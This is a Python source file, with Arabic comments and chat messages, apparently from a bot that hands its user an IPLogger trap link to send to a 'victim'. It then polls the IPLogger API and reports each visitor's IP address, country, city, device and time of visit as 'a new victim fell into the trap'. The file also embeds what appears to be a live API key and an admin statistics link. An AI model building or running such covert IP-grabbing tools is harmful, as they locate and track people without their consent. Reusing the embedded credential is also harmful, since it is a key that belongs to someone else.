import requests
import logging

# إعدادات الرادار الخاصة بك
IPLOGGER_API_KEY = "api_RVY0PSFpEyLLazw12mpyQuJq84i6nHQJ"
# تم تحديث المعرف بناءً على الرابط الجديد الذي قدمته
LOGGER_ID = "XztwW" 
SENT_IPS = set() # لمنع تكرار الإشعارات لنفس الضحية

async def create_iplogger_link(destination_url=None):
    """
    يعرض رابط التتبع الثابت الذي قمت بإنشائه.
    """
    # الرابط الذي سترسله للضحية
    static_link = f"https://iplogger.co/{LOGGER_ID}.html" 
    # رابط الإحصائيات للمتابعة اليدوية
    admin_link = "https://iplogger.org/logger/zY5m5YSBeCKN"
    
    return (
        f"✅ **تم تفعيل الرابط الثابت بنجاح!**\n\n"
        f"🎯 **الرابط المرسل للضحية (الفخ):**\n`{static_link}`\n\n"
        f"📡 **الحالة:** الرادار يراقب هذا الرابط الآن.\n"
        f"📊 **رابط الإحصائيات للمتابعة:**\n{admin_link}\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"💡 **ملحوظة:** بمجرد دخول أي شخص، سأقوم بإرسال بياناته إليك هنا تلقائياً."
    )

async def check_new_logs():
    """
    دالة الرادار: تفحص السجلات الجديدة للرابط الثابت عبر الـ API الرسمي.
    """
    # رابط جلب السجلات باستخدام API Key والمعرف الخاص بك
    api_url = f"https://api.iplogger.org/v1/logs/get?api_key={IPLOGGER_API_KEY}&id={LOGGER_ID}"
    
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # استخراج النتائج من الحقل الصحيح في استجابة IPLogger
            logs = data.get("result", [])
            
            if not logs:
                return None
            
            new_logs_found = []
            for log in logs:
                ip = log.get("ip")
                
                # التحقق من أن هذا الـ IP لم يتم التبليغ عنه في الجلسة الحالية
                if ip and ip not in SENT_IPS:
                    SENT_IPS.add(ip)
                    
                    # تنسيق رسالة البيانات بشكل احترافي
                    details = (
                        f"🚨 **إشعار: ضحية جديدة سقطت في الفخ!**\n\n"
                        f"🌐 **العنوان الرقمي (IP):** `{ip}`\n"
                        f"📍 **البلد:** {log.get('country_name', 'غير معروف')}\n"
                        f"🏙️ **المدينة:** {log.get('city', 'غير معروف')}\n"
                        f"📱 **نوع الجهاز:** {log.get('user_agent', 'غير معروف')[:60]}...\n"
                        f"⏰ **وقت الدخول:** {log.get('date', 'غير معروف')}"
                    )
                    new_logs_found.append(details)
            
            return new_logs_found if new_logs_found else None
            
    except Exception as e:
        logging.error(f"Radar Check Error: {e}")
    
    return None